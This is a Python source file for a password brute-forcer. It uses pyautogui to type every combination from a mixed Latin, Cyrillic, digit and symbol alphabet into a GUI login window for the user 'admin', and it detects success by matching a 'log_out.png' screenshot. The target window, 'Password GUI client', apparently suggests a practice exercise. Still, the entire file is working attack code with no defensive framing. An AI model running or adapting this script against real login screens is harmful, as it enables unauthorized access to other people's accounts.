import time

import pyautogui
import pygetwindow

from custom_logger import dpi_logger

MASK = 0x3F


def build_alphabet(bitmask: int) -> str:
    alphabet = ''
    if bitmask & (1 << 0):
        alphabet += '0123456789'
    if bitmask & (1 << 1):
        alphabet += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    if bitmask & (1 << 2):
        alphabet += "abcdefghijklmnopqrstuvwxyz"
    if bitmask & (1 << 3):
        alphabet += 'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ'
    if bitmask & (1 << 4):
        alphabet += 'абвгдеёжзийклмнопрстуфхцчшщъыьэюя'
    if bitmask & (1 << 5):
        alphabet += '!@#$%^&*()-_=+[]{}|;:\'",.<>/?`~'
    return alphabet


def hack_pass(start_pass_len=1, target_window_title=None):
    alpha = build_alphabet(MASK)
    alpha_len = len(alpha)

    pass_length = start_pass_len
    indexes_list = [0] * pass_length
    attempts = 0

    start_time = time.time()
    while True:
        try:
            current_window = pygetwindow.getActiveWindow()
            if current_window.title != target_window_title:
                elapsed = time.time() - start_time
                forged_pass = ''.join(alpha[index] for index in indexes_list)
                avg = elapsed / attempts if attempts > 0 else 0
                dpi_logger.info(
                    f"Brute-force interrupted: Target window '{target_window_title}' is no longer active")
                dpi_logger.info(f"Last tried password: {forged_pass}")
                dpi_logger.info(f"Total attempts: {attempts}")
                dpi_logger.info(f"Total time: {elapsed:.2f} s")
                dpi_logger.info(f"Avg time per attempt: {avg:.5f} s")
                return
        except pygetwindow.PyGetWindowException:
            elapsed = time.time() - start_time
            forged_pass = ''.join(alpha[index] for index in indexes_list)
            avg = elapsed / attempts if attempts > 0 else 0
            dpi_logger.info(f"Brute-force interrupted: Target window '{target_window_title}' was closed")
            dpi_logger.info(f"Last tried password: {forged_pass}")
            dpi_logger.info(f"Total attempts: {attempts}")
            dpi_logger.info(f"Total time: {elapsed:.2f} s")
            dpi_logger.info(f"Avg time per attempt: {avg:.5f} s")
            return

        forged_pass = ''.join(alpha[index] for index in indexes_list)

        elapsed = time.time() - start_time
        dpi_logger.debug(f"[{attempts}] Trying: {forged_pass} | Elapsed: {elapsed:.2f}s")

        attempts += 1
        if try_password(forged_pass):
            elapsed = time.time() - start_time
            avg = elapsed / attempts
            dpi_logger.info(f"Password hacked: {forged_pass}")
            dpi_logger.info(f"Total attempts: {attempts}")
            dpi_logger.info(f"Total time: {elapsed:.2f} s")
            dpi_logger.info(f"Avg time per attempt: {avg:.5f} s")
            return

        # Iterate through each symbol of alphabet, until pass len limit
        curr_pos = pass_length - 1
        while curr_pos >= 0:
            # If index represents last symb in alpha, then switch to next pos, else increment index on this pos
            if (indexes_list[curr_pos] + 1) < alpha_len:
                indexes_list[curr_pos] += 1
                break
            else:
                indexes_list[curr_pos] = 0
                curr_pos -= 1

        # Increment password len and do again
        else:
            pass_length += 1
            indexes_list = [0] * pass_length


def select_window():
    dpi_logger.info("Select program window to capture")
    time.sleep(5)
    active_win = pygetwindow.getActiveWindow()
    if active_win.title != "Password GUI client":
        return None

    dpi_logger.info(f"Window captured: {active_win.title}")
    return active_win.title


def fill_login(login: str):
    pyautogui.press('tab')

    pyautogui.typewrite(login)
    pyautogui.press('tab')


def try_password(password: str) -> bool:
    pyautogui.typewrite(password)
    pyautogui.press('tab')
    pyautogui.press('enter')

    try:
        location = pyautogui.locateOnScreen("log_out.png", confidence=0.7)
        if location:
            return True
    except pyautogui.ImageNotFoundException:
        pass

    for _ in range(3):
        pyautogui.press('tab')

    return False


def start_brute(login):
    title = select_window()

    if title:
        fill_login(login)
        hack_pass(start_pass_len=2, target_window_title=title)

    else:
        dpi_logger.error("Wrong window selected")
        return


if __name__ == "__main__":
    start_brute("admin")
